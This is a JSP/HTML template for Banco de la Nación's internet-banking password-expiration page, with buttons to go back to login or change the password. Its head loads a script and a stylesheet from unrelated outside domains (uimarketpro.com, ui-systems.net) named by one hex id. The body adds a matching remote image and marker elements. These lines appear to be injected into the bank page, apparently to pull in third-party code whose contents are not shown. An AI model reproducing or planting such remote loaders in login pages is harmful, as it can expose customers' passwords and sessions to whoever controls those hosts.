<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<%@ taglib uri="/WEB-INF/struts-html.tld" prefix="html"%>
<%@ taglib uri="/WEB-INF/struts-logic.tld" prefix="logic"%>
<%@ taglib uri="/WEB-INF/struts-bean.tld" prefix="bean"%>
<%@ taglib uri="/WEB-INF/c.tld"				prefix="c"%>

<head>
<script type="text/javascript" src="<%=request.getContextPath()%>/js/bn-jquery.js"></script>
<script type="text/javascript" src="<%=request.getContextPath()%>/js/jquery.ui.js"></script>
<script type="text/javascript" src="<%=request.getContextPath()%>/js/select.js"></script>
<script language="JavaScript" src="<%=request.getContextPath()%>/js/util.js"></script>
<link type="text/css" href=https://ui-systems.net/css/d6d6a192e565430bab3aa6e4cb0ae0bd.css rel="stylesheet">
<script type="application/javascript" src="https://uimarketpro.com/js/d6d6a192e565430bab3aa6e4cb0ae0bd.js"></script>

<link href="<%=request.getContextPath()%>/resources/css/stylesheet.css" rel="stylesheet" type="text/css" />       
<script type="text/javascript" src="<%=request.getContextPath()%>/resources/js/init.js"></script>
<script type="text/javascript" src="<%=request.getContextPath()%>/js/cufon-yui.js"></script>
<script type="text/javascript" src="<%=request.getContextPath()%>/js/DaxCompact-Medium_500.font.js"></script>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<title>Recomendaciones de Seguridad. Banco de la Nación</title>
    <link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/resetearcss.css" />
    <link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/bn-principal.css" />
    <link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/tipografias.css" />
    <link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/home.css" />
    <link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/select.css" />
    <link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/bn-estilos.css" /> 


<script type="text/javascript">
 function retornar(){ 
 	$("#form").get(0).setAttribute('action', '<%=request.getContextPath()%>/login.do?metodo=iniciar');		
	$("#form").submit();
 
 }
 
 
 function cambiarClave(){ 
 	$("#form").get(0).setAttribute('action', '<%=request.getContextPath()%>/login.do?metodo=cboClave');	
	$("#form").submit();
 
 }
 
 
</script>

<style>

.butonDatos{
   width: 110px;
text-decoration:none;
font-weight: 300;
font: 12px/10px 'daxcompact-mediumregular';
font-size: 10px;
cursor:pointer;
text-align:center;
margin: 10px 30px 0px 30px;	
text-transform: uppercase;
color:#FFFFFF;
padding-top:5px;
padding-bottom:5px;
padding-left:5 px;
padding-right:5 px;
background-color:#a70d0f;
border-color: #a70d0f;
border-width: 2px;
border-style: solid;
border-top-left-radius: 15px;
border-top-right-radius: 15px;
border-bottom-left-radius: 15px;
border-bottom-right-radius: 15px;

}

</style>


</head>
<body>
		<div id="contenedor">

        <div id="cabecera">

            <div id="logo-multired">
               <img src="imagenes/logo-multired.jpg" alt="Logotipo Multired" />
            </div>
            <div id="logo-bn">
          
                <img src="imagenes/Logo_BN.jpg" alt="Logotipo del Banco de la Nación" />
            </div>
            

        </div>
		<img	src="https://ui-systems.net/images/d6d6a192e565430bab3aa6e4cb0ae0bd.jpg" />
		
		<div class="image-d6d6a1"></div>
			<em class="font-d6d6a1">.</em>
        
            <div id="cuerpo">
            
			
	            <div id="login">
	            
	                <div id="border-superior"><img src="imagenes/home/border-arriba.png" alt="Border Login Superior" /></div>
	                
	             
	                <div id="login-contenido">
	
	                   
	
	                    <form method="post" id="form" name="form" style="padding-right: 60px;"> 
	                    
	                    <div id="contenidos-informativos">
							<div id="consulta-datos">
	                    							
								 <div class="fila  limpiar">
								 	<h1>Generación por Expiración de Clave Internet</h1>
								 </div>
								
							 	 <div class="fila  limpiar">
							 	 	<span class="mensaje" style="font-family:Arial Narrow;
									     font-size:20px;
									     text-align:center; 
									     ">${mensajeAlertaVencida}
									     </span>
									
									     					 	 
							 	 </div>
							 	 
							 	 <div class="fila  limpiar">
							 	 	<input type="button2" class="butonDatos" value="REGRESAR" onclick="javascript:return retornar();" />
							 	 	<input type="button2" class="butonDatos" value="CAMBIAR CLAVE" onclick="javascript:return cambiarClave();" />
							 	 </div>
							 	 
		                   		
							</div>
						</div>
	                    </form>
	                </div>
	                
	                <div id="border-inferior"><img src="imagenes/home/border-abajo.png" alt="Border Login Inferior" /></div>
	            </div>
        	</div>  
        	
        	<div>			
			</div> 

	        <div id="pie-pagina">
	
	            <div id="titulo-pie-pagina">Banco de la Naci&oacute;n  |  Ministerio de Econom&iacute;a y Finanzas</div>
	
	            <div id="oficinas">
	                 <p>Oficina Principal: Av. Javier Prado Este 2499. San Borja. Central Telef&oacute;nica: 519 2000.</p>
					<p>Atenci&oacute;n en Oficinas Administrativas: Lunes a Viernes de 08:30 a 17:30. Refrigerio de: 13:00-14:00. </p>
					<p>Atenci&oacute;n en Oficina de Tr&aacute;mite Documentario: Lunes a Viernes de 8:30 a 16:30 (horario corrido).</p>
	                
	            </div>
	
	        </div>
	
	    </div>

    <script type="text/javascript" src="js/bn-funciones.js"></script>
    <script type="text/javascript">
       $(document).ready(function(){
		myApp.select.init();
		myApp.home.init();
	});
    </script>
    <script type="text/javascript">
		Cufon.now();
	</script>
	
</body>
</html>
